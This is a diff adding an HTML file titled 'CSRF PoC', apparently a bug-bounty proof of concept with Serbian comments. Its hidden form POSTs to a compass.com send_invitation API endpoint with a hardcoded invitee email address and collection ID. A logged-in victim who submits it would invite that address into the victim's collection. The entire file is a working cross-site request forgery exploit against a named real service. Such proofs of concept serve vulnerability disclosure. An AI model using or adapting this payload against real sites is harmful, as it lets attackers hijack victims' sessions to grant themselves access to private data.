@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+  </head>
+  <body>
+    <h1>CSRF PoC za dodavanje novog člana</h1>
+    
+    <!-- Forma za slanje POST zahteva -->
+    <form method="POST" action="https://www.compass.com/api/v3/collection_users_commands/send_invitation">
+      <!-- Email adresa koju dodajemo -->
+      <input type="hidden" name="emailAddressesToInvite[]" value="momivi7017@bulatox.com">
+      <!-- ID kolekcije -->
+      <input type="hidden" name="collectionId" value="6717547b743b8c0001cdaf9f">
+      
+      <!-- Dugme za slanje -->
+      <input type="submit" value="Submit Request">
+    </form>
+  </body>
+</html>
